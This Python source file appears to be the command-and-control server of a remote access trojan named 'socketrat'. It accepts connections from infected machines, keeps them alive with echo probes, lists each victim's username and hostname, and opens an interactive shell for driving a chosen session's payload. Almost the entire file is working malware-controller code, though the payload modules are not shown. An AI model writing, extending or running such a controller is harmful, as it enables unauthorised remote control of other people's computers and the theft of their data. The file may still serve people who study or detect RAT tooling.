# -*- coding: utf-8 -*-

import cmd
import os
import socket
import socketserver
import sys
import threading
import time
import traceback

from colorama import colorama_text, Fore, Style
from tabulate import tabulate

from . import connection
from . import session


class SimpleRATRequestHandler(socketserver.BaseRequestHandler):
    
    def setup(self):
        #self.client_address
        self.request.settimeout(5)
        self.session = session.Session(self.request)
        self.server.add_session(self.session)

    def handle(self):
        while not self.server.server_closed:
            time.sleep(1)
            #if self.session.last_response > ...
            try:
                self.session.rpc.echo('hello?')
            except socket.timeout:
                #TODO: maybe have max retry for response?
                #      For now just disconnect.
                break
            except connection.ConnectionClosed:
                break
            except (ConnectionResetError, BrokenPipeError, OSError):
                break
            except:
                # unknown error.
                traceback.print_exc()
                pass

    def finish(self):
        self.session.close()
        self.server.remove_session(self.session)


class RATServer(socketserver.TCPServer):
    allow_reuse_address = True

    def __init__(self, server_address,
            RequestHandlerClass=SimpleRATRequestHandler,
            *args, **kwargs):
        self.sessions = session.SessionContainer()
        self._close_event = threading.Event()
        super().__init__(server_address, RequestHandlerClass, *args, **kwargs)

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

    def close(self):
        self.server_close()
        for s in self.sessions.values():
            s.close()

    @property
    def server_closed(self):
        return self._close_event.is_set()

    def add_session(self, session):
        self.sessions.add(session)

    def remove_session(self, session):
        self.sessions.remove(session)

    def add_connection(self, address):
        pass


class ThreadingRATServer(socketserver.ThreadingMixIn, RATServer):
    daemon_threads = True


class RATServerCmd(cmd.Cmd):
    prompt = '(socketrat) '
    ruler = '-'
    nohelp = '*** {}'.format(Style.BRIGHT + Fore.RED + 'No help on %s' + Style.RESET_ALL)

    def __init__(self, server, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.server = server
        self.SessionCmdClass = session.PayloadSessionCmd

    @property
    def sessions(self):
        return self.server.sessions

    def cmdloop(self, intro=None, *args, **kwargs):
        '''Handle keyboard interrupts during cmdloop.'''
        with colorama_text(autoreset=True):
            try:
                super().cmdloop(intro=intro, *args, **kwargs)
            except KeyboardInterrupt:
                print()
            else:
                return

            while True:
                try:
                    super().cmdloop(intro='', *args, **kwargs)
                except KeyboardInterrupt:
                    print()
                else:
                    return

    def onecmd(self, line):
        with colorama_text(autoreset=True):
            return super().onecmd(line)

    def emptyline(self):
        pass

    def default(self, line):
        self.error('Unknown syntax: {}'.format(line))

    def error(self, msg):
        #TODO: use self.stderr here.
        print('*** {}'.format(
            Style.BRIGHT + Fore.RED + msg.capitalize() + Style.RESET_ALL,
        ))

    def do_clear(self, line):
        '''Clear the screen.'''
        cmd = 'clear'
        if sys.platform.startswith('win'):
            cmd = 'cls'
        os.system(cmd)

    def do_connect(self, line):
        '''Connect to a bind payload.'''
        pass

    def do_sessions(self, line):
        '''Display connected clients.'''
        if not self.sessions:
            self.error('No clients connected')
            return
        headers = ['ID', 'Username', 'Hostname']
        table = [(s.id, s.username, s.hostname)
                for s in self.sessions.values()]
        print()
        print(tabulate(table, headers=headers))
        print()

    def do_exit(self, line):
        '''Exit the shell.'''
        return True

    def do_interact(self, line):
        '''Interact with a session.'''
        sessid = line
        if not sessid:
            self.error('Session ID required')
            return
        if sessid not in self.sessions:
            self.error('Unknown session id: {}'.format(sessid))
            return
        session = self.sessions[sessid]
        sh = self.SessionCmdClass(session)

        intro = 'Interacting with session {} ...'.format(sessid)
        #intro += ' Type help or ? to list commands.\n'

        sh.cmdqueue.append('info')
        sh.cmdloop(intro=intro)
        print('Detached from session {}.'.format(sessid))
        print()


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('--bind', '-b',
            metavar='ADDRESS',
            help='Specify alternate bind address '
                 '[default: all interfaces]',
            default='',
    )
    parser.add_argument('port',
            action='store',
            default=8000, type=int,
            nargs='?',
            help='Specify alternate port [default: 8000]',
    )
    args = parser.parse_args()

    host, port = addr = args.bind, args.port
    if not host:
        host = '0.0.0.0'
    if host == '127.0.0.1':
        host = 'localhost'

    with ThreadingRATServer(addr) as server:
        t = threading.Thread(target=server.serve_forever)
        t.daemon = True
        t.start()

        sh = RATServerCmd(server)
        intro = 'Serving on {} port {} ...\n'.format(host, port)
        intro += 'Type help or ? to list commands.\n'
        #sh.cmdqueue.append('help')
        try:
            sh.cmdloop(intro=intro)
        finally:
            print('exiting, stopping server.')
            server.shutdown()

